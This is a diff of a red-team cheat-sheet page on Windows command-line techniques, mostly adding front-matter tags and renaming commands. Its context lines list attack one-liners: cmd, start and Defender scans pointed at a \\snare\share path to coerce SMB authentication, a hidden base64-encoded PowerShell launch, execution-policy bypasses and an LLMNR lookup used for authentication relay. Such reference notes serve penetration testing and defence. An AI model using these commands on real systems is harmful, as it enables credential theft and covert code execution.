@@ -1,6 +1,14 @@
+---
+author(s):
+  - Userware
+tags:
+  - initial-access
+  - weaponization
+  - client-side-attacks
+  - living-off-the-land
+  - windows
+---
 # Windows CLI Console
-
-Search Tag(s): #weaponization #client-side-attacks #living-off-the-land #windows
 
 ## Command Prompt
 
@@ -25,7 +33,7 @@ C:\> cmd.exe /k \\snare\share
 
 C:\> cmd.exe /c \\snare\share
 
-C:\> start.exe \\snare\share
+C:\> start \\snare\share
 
 C:\> mkdir \\snare\share
 
@@ -41,7 +49,7 @@ C:\> MpCmdRun.exe -Scan -ScanType 3 -File \\snare\share\file.txt
 TODO: Check the rest
 
 ```
-find, findstr, [x]copy, move, replace, del, rename and many more!
+find.exe, findstr.exe, [x]copy, move, replace.exe, del, rename and many more!
 ```
 
 ## PowerShell
@@ -89,7 +97,7 @@ C:\> powershell.exe -nop -NonI -Nologo -w hidden -enc <base64_encoded>
 ```
 PS C:\> Set-ExecutionPolicy Bypass -Scope <CurrentUser | Process> [-File C:\path\to\file.ps1
 
-PS C:\> $env:PSExecutionPolicyPreference="bypass"
+PS C:\> $Env:PSExecutionPolicyPreference="bypass"
 ```
 
 Execute cmdlet to perform SMB authentication relay.
@@ -103,7 +111,7 @@ PS C:\> Resolve-DnsName -LlmnrOnly Snare 2> $Null
 ## Conhost
 
 ```
-C:\> conhost --headless <commands>
+C:\> conhost.exe --headless <commands>
 ```
 
 ```
